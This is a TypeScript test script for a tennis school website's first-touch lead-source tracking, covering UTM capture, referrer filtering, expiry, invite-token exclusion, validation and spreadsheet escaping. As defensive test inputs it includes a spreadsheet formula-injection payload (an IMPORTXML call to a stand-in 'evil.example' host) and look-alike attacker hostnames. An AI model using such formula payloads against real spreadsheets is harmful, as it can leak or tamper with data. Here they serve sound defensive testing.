// Run from project root: npx tsx src/scripts/test-lead-source.ts
// Pins the first-touch capture rules (src/lib/leadSource.ts, backlog #26):
// first touch wins for 90 days, expiry frees the slot, an untagged direct
// visit stores nothing, own-host referrers are ignored, the invite token is
// never stored or accepted, and the record only ever holds the named keys.
// Exits non-zero on any failure.

import {
  FIRST_TOUCH_KEY,
  FIRST_TOUCH_KEYS,
  FIRST_TOUCH_TTL_DAYS,
  LEAD_SOURCE_MAX_LENGTH,
  asSheetText,
  buildLeadSourceCells,
  dateStamp,
  firstTouchFromVisit,
  isExpired,
  isOwnHost,
  readFirstTouch,
  recordFirstTouch,
  sanitizeLeadSource,
  type StorageLike,
} from "../lib/leadSource";
import { PASS_THROUGH_HOSTS } from "../lib/firstTouchBrowser";

let failures = 0;

function check(name: string, actual: unknown, expected: unknown) {
  const a = JSON.stringify(actual);
  const e = JSON.stringify(expected);
  if (a === e) {
    console.log(`  ✓ ${name}`);
  } else {
    failures++;
    console.error(`  ✗ ${name}\n      expected ${e}\n      got      ${a}`);
  }
}

/** An in-memory localStorage; `broken` makes every call throw. */
function fakeStorage(broken = false): StorageLike & { raw(): string | null } {
  const map = new Map<string, string>();
  return {
    getItem(k) {
      if (broken) throw new Error("storage disabled");
      return map.get(k) ?? null;
    },
    setItem(k, v) {
      if (broken) throw new Error("storage disabled");
      map.set(k, v);
    },
    raw: () => map.get(FIRST_TOUCH_KEY) ?? null,
  };
}

const OWN = ["tennisbootcamp.ca", "tennisbootcamp-seven.vercel.app", "localhost"];
const NOW = new Date("2026-10-08T15:30:00.000Z");
const visit = (href: string, referrer = "", now = NOW) =>
  firstTouchFromVisit({ href, referrer, ownHosts: OWN, now });

// ─── What a landing stores ───────────────────────────────────────────────────

console.log("capture");

check(
  "the acceptance URL: utm tags, landing path without query, today's date",
  visit("https://tennisbootcamp.ca/?utm_source=instagram&utm_medium=social&utm_campaign=test"),
  { utm_source: "instagram", utm_medium: "social", utm_campaign: "test", landing_path: "/", first_seen: "2026-10-08" }
);
check(
  "all seven tags are read, in storage order",
  Object.keys(
    visit("https://tennisbootcamp.ca/programs?utm_source=a&utm_medium=b&utm_campaign=c&utm_content=d&utm_term=e&gclid=f&fbclid=g") ?? {}
  ),
  ["utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term", "gclid", "fbclid", "landing_path", "first_seen"]
);
check(
  "a gclid alone is enough; the landing path keeps no query string",
  visit("https://tennisbootcamp.ca/programs/youth?gclid=Cj0KCQ&program=youth"),
  { gclid: "Cj0KCQ", landing_path: "/programs/youth", first_seen: "2026-10-08" }
);
check(
  "an external referrer alone: its origin only, never the full URL",
  visit("https://tennisbootcamp.ca/intake", "https://www.reddit.com/r/toronto/comments/abc?x=1"),
  { referrer_origin: "https://www.reddit.com", landing_path: "/intake", first_seen: "2026-10-08" }
);
check(
  "tags plus an external referrer: both kept",
  visit("https://tennisbootcamp.ca/?utm_source=ig", "https://l.instagram.com/?u=x"),
  { utm_source: "ig", referrer_origin: "https://l.instagram.com", landing_path: "/", first_seen: "2026-10-08" }
);
check("no tags, no referrer → nothing", visit("https://tennisbootcamp.ca/"), null);
check(
  "no tags, own-host referrer → nothing",
  visit("https://tennisbootcamp.ca/intake", "https://tennisbootcamp.ca/programs"),
  null
);
check(
  "a subdomain of an own host is still own (www., preview deployments)",
  [
    visit("https://tennisbootcamp.ca/intake", "https://www.tennisbootcamp.ca/"),
    visit("https://tennisbootcamp.ca/intake", "https://tennisbootcamp-git-x-sina.tennisbootcamp-seven.vercel.app/"),
    visit("http://localhost:3000/intake", "http://localhost:3000/"),
  ],
  [null, null, null]
);
check(
  "a look-alike host is not own",
  visit("https://tennisbootcamp.ca/", "https://nottennisbootcamp.ca/")?.referrer_origin,
  "https://nottennisbootcamp.ca"
);
check(
  "an unreadable referrer counts as none",
  visit("https://tennisbootcamp.ca/", "not a url"),
  null
);
check("an unreadable landing URL stores nothing", visit("nope"), null);
check(
  "empty tag values do not count",
  visit("https://tennisbootcamp.ca/?utm_source=&gclid=%20"),
  null
);
check(
  "a tag value is capped at 200 characters",
  visit(`https://tennisbootcamp.ca/?utm_campaign=${"c".repeat(600)}`)?.utm_campaign?.length,
  LEAD_SOURCE_MAX_LENGTH
);
check(
  "own-host match is case-insensitive and exact on the label boundary",
  [isOwnHost("WWW.TennisBootcamp.ca", OWN), isOwnHost("tennisbootcamp.ca.evil.com", OWN), isOwnHost("", OWN)],
  [true, false, false]
);
check(
  "landing_path and referrer_origin are capped at write time",
  (() => {
    const r = firstTouchFromVisit({
      href: `https://tennisbootcamp.ca/${"p".repeat(600)}?utm_source=x`,
      referrer: `https://${Array.from({ length: 5 }, () => "h".repeat(60)).join(".")}.example.com/`,
      ownHosts: OWN,
      now: NOW,
    });
    return [r?.landing_path?.length, r?.referrer_origin?.length];
  })(),
  [LEAD_SOURCE_MAX_LENGTH, LEAD_SOURCE_MAX_LENGTH]
);
check(
  "a tag containing @ is not captured (no email addresses)",
  visit("https://tennisbootcamp.ca/?utm_source=sina@example.com&utm_medium=email"),
  { utm_medium: "email", landing_path: "/", first_seen: "2026-10-08" }
);

// Hosts the site bounces a visitor through (Stripe Checkout, Supabase auth,
// Google sign-in) are never a source.
console.log("pass-through hosts");
check(
  "stripe, supabase and google accounts are ignored as referrers, subdomains included",
  [
    "checkout.stripe.com", "stripe.com", "abcd1234.supabase.co", "supabase.com", "accounts.google.com",
  ].map((h) => isOwnHost(h, PASS_THROUGH_HOSTS)),
  [true, true, true, true, true]
);
check(
  "google search and other vercel sites are still sources",
  ["www.google.com", "someone-else.vercel.app", "mail.google.com"].map((h) => isOwnHost(h, PASS_THROUGH_HOSTS)),
  [false, false, false]
);
check(
  "a return from Stripe Checkout stores nothing",
  firstTouchFromVisit({
    href: "https://tennisbootcamp.ca/enroll/confirmed?row=3",
    referrer: "https://checkout.stripe.com/c/pay/cs_test_abc",
    ownHosts: [...OWN, ...PASS_THROUGH_HOSTS],
    now: NOW,
  }),
  null
);

// ─── The invite token ────────────────────────────────────────────────────────

console.log("invite token");

const inviteVisit = visit(
  "https://tennisbootcamp.ca/enroll/abc?invite=tok123&utm_source=email&utm_campaign=cohort-1"
);
check(
  "a tagged invite link stores the tags and the path, never the token",
  inviteVisit,
  { utm_source: "email", utm_campaign: "cohort-1", landing_path: "/enroll/abc", first_seen: "2026-10-08" }
);
check(
  "the stored JSON never contains the token",
  JSON.stringify(inviteVisit).includes("tok123"),
  false
);
check(
  "an untagged invite link stores nothing at all",
  visit("https://tennisbootcamp.ca/enroll/abc?invite=tok123"),
  null
);
check(
  "a record posted with an invite key loses it on validation",
  sanitizeLeadSource({ utm_source: "x", invite: "tok123", landing_path: "/", first_seen: "2026-10-08" }),
  { utm_source: "x", landing_path: "/", first_seen: "2026-10-08" }
);
check("invite is not a record key", (FIRST_TOUCH_KEYS as readonly string[]).includes("invite"), false);

// ─── Storage: first touch wins, expiry, resilience ───────────────────────────

console.log("storage");

const s1 = fakeStorage();
const first = recordFirstTouch(s1, {
  href: "https://tennisbootcamp.ca/?utm_source=instagram&utm_medium=social&utm_campaign=test",
  referrer: "",
  ownHosts: OWN,
  now: NOW,
});
check("first tagged visit is stored", JSON.parse(s1.raw() ?? "null"), first);

const later = new Date("2026-10-20T09:00:00.000Z");
const second = recordFirstTouch(s1, {
  href: "https://tennisbootcamp.ca/?utm_source=google&gclid=abc",
  referrer: "https://www.google.com/",
  ownHosts: OWN,
  now: later,
});
check("a second tagged visit inside 90 days does not overwrite (first touch wins)", second, first);
check("storage still holds the first record", JSON.parse(s1.raw() ?? "null"), first);
check("the quiz reads the first record", readFirstTouch(s1, later), first);

// The clock starts at the stored date (UTC midnight), not at the visit's time.
const expiredAt = new Date(Date.parse(first?.first_seen ?? "") + FIRST_TOUCH_TTL_DAYS * 24 * 60 * 60 * 1000);
check("read after 90 days → null (expired)", readFirstTouch(s1, expiredAt), null);
check(
  "read one second before 90 days → still the record",
  readFirstTouch(s1, new Date(expiredAt.getTime() - 1000)),
  first
);
const replaced = recordFirstTouch(s1, {
  href: "https://tennisbootcamp.ca/?utm_source=google&gclid=abc",
  referrer: "",
  ownHosts: OWN,
  now: expiredAt,
});
// expiredAt is 2027-01-06T00:00Z, which is the evening of Jan 5 in Toronto.
check(
  "an expired record is replaced by the next tagged visit",
  replaced,
  { utm_source: "google", gclid: "abc", landing_path: "/", first_seen: "2027-01-05" }
);

const s2 = fakeStorage();
check(
  "an untagged direct visit stores nothing",
  [recordFirstTouch(s2, { href: "https://tennisbootcamp.ca/", referrer: "", ownHosts: OWN, now: NOW }), s2.raw()],
  [null, null]
);
check(
  "…so a later tagged visit is still recorded",
  recordFirstTouch(s2, { href: "https://tennisbootcamp.ca/programs?fbclid=IwAR1", referrer: "", ownHosts: OWN, now: later })?.fbclid,
  "IwAR1"
);

const s3 = fakeStorage();
s3.setItem(FIRST_TOUCH_KEY, "{not json");
check("corrupt storage reads as null", readFirstTouch(s3, NOW), null);
check(
  "corrupt storage is replaced by a tagged visit",
  recordFirstTouch(s3, { href: "https://tennisbootcamp.ca/?utm_source=x", referrer: "", ownHosts: OWN, now: NOW })?.utm_source,
  "x"
);

const s4 = fakeStorage();
s4.setItem(FIRST_TOUCH_KEY, JSON.stringify({ utm_source: "old", landing_path: "/" }));
check("a stored record without a date is treated as expired", readFirstTouch(s4, NOW), null);

const s5 = fakeStorage();
s5.setItem(FIRST_TOUCH_KEY, JSON.stringify({ utm_source: "x", invite: "tok", landing_path: "/", first_seen: "2026-10-01" }));
check(
  "a stored record is re-validated on read: unknown keys never reach the quiz",
  readFirstTouch(s5, NOW),
  { utm_source: "x", landing_path: "/", first_seen: "2026-10-01" }
);

const broken = fakeStorage(true);
check(
  "a storage that throws never throws out of the capture",
  recordFirstTouch(broken, { href: "https://tennisbootcamp.ca/?utm_source=x", referrer: "", ownHosts: OWN, now: NOW })?.utm_source,
  "x"
);
check("a storage that throws reads as null", readFirstTouch(broken, NOW), null);

// ─── The date is the owner's calendar (America/Toronto) ──────────────────────

console.log("date");
check("midday UTC is the same day in Toronto", dateStamp(new Date("2026-10-08T15:30:00.000Z")), "2026-10-08");
check(
  "02:00 UTC on the 9th is still the 8th in Toronto (EDT)",
  dateStamp(new Date("2026-10-09T02:00:00.000Z")),
  "2026-10-08"
);
check(
  "04:30 UTC on Jan 2 is still Jan 1 in Toronto (EST)",
  dateStamp(new Date("2027-01-02T04:30:00.000Z")),
  "2027-01-01"
);
check("the stamp always has the YYYY-MM-DD shape", /^\d{4}-\d{2}-\d{2}$/.test(dateStamp(new Date())), true);

// ─── Expiry arithmetic ────────────────────────────────────────────────────────

console.log("expiry");
check("null is expired", isExpired(null, NOW), true);
check("a bad date is expired", isExpired({ first_seen: "yesterday" }, NOW), true);
check("today is not expired", isExpired({ first_seen: "2026-10-08" }, NOW), false);
check("89 days is not expired", isExpired({ first_seen: "2026-07-11" }, NOW), false);
check("90 days is expired", isExpired({ first_seen: "2026-07-10" }, NOW), true);

// ─── Validation ───────────────────────────────────────────────────────────────

console.log("validation");
check("non-object → null", [sanitizeLeadSource(null), sanitizeLeadSource("x"), sanitizeLeadSource([1])], [null, null, null]);
check("non-string values dropped", sanitizeLeadSource({ utm_source: 1, gclid: true, first_seen: "2026-10-08" }), { first_seen: "2026-10-08" });
check("nothing valid → null", sanitizeLeadSource({ utm_source: "", foo: "bar" }), null);
check("values trimmed and capped", sanitizeLeadSource({ utm_term: `  ${"t".repeat(300)}  ` })?.utm_term?.length, 200);
check(
  "first_seen must be YYYY-MM-DD",
  [
    sanitizeLeadSource({ first_seen: "yesterday" }),
    sanitizeLeadSource({ first_seen: "2026-1-8" }),
    sanitizeLeadSource({ first_seen: "2026-10-08T15:30:00Z" }),
    sanitizeLeadSource({ first_seen: "2026-10-08" }),
  ],
  [null, null, null, { first_seen: "2026-10-08" }]
);
check(
  "landing_path must start with /",
  [
    sanitizeLeadSource({ landing_path: "evil" }),
    sanitizeLeadSource({ landing_path: "https://evil.example/" }),
    sanitizeLeadSource({ landing_path: "/programs" }),
  ],
  [null, null, { landing_path: "/programs" }]
);
check(
  "a tag or click id containing @ is dropped",
  sanitizeLeadSource({ utm_source: "a@b.com", utm_campaign: "fall", gclid: "x@y", fbclid: "ok" }),
  { utm_campaign: "fall", fbclid: "ok" }
);

// ─── Nothing in the new columns can run as a formula ─────────────────────────

console.log("sheet text");
check(
  "formula-leading values get a leading apostrophe",
  ["=HYPERLINK(\"x\")", "+1", "-cmd", "@foo", "=NOW()", "\tx", "\rx"].map(asSheetText),
  ["'=HYPERLINK(\"x\")", "'+1", "'-cmd", "'@foo", "'=NOW()", "'\tx", "'\rx"]
);
check(
  "every non-empty value is stored as text: 001 and dates do not coerce, blanks stay blank",
  ["instagram", "001", "2026-10-08", "/", "direct", "", "fall launch"].map(asSheetText),
  ["'instagram", "'001", "'2026-10-08", "'/", "'direct", "", "'fall launch"]
);
check(
  "a poisoned campaign tag reaches the row as text",
  buildLeadSourceCells(visit("https://tennisbootcamp.ca/?utm_source=ig&utm_campaign=%3DIMPORTXML(%22https://evil.example%22,%22//a%22)")),
  ["'ig", "", "'=IMPORTXML(\"https://evil.example\",\"//a\")", "", "", "'/", "'2026-10-08"]
);
check(
  "every lead cell goes through the escape (source, click_id and path too)",
  buildLeadSourceCells({ utm_source: "=1+1", gclid: "x", landing_path: "/", first_seen: "2026-10-08" })[0],
  "'=1+1"
);

// ─── Cells ────────────────────────────────────────────────────────────────────

console.log("cells");
check("direct (six blanks stay blank)", buildLeadSourceCells(null), ["'direct", "", "", "", "", "", ""]);
check(
  "the acceptance row (Sheets shows instagram, social, test, /, 2026-10-08)",
  buildLeadSourceCells(visit("https://tennisbootcamp.ca/?utm_source=instagram&utm_medium=social&utm_campaign=test")),
  ["'instagram", "'social", "'test", "", "", "'/", "'2026-10-08"]
);
check(
  "referrer host as source, bare hostname (no scheme)",
  buildLeadSourceCells(visit("https://tennisbootcamp.ca/", "https://t.co/abc"))[0],
  "'t.co"
);
check(
  "utm_term is kept in the record but has no column",
  buildLeadSourceCells(visit("https://tennisbootcamp.ca/?utm_source=g&utm_term=tennis+lessons")),
  ["'g", "", "", "", "", "'/", "'2026-10-08"]
);

// ─── Result ───────────────────────────────────────────────────────────────────

if (failures > 0) {
  console.error(`\n${failures} check(s) failed`);
  process.exit(1);
}
console.log("\nall lead-source checks passed");
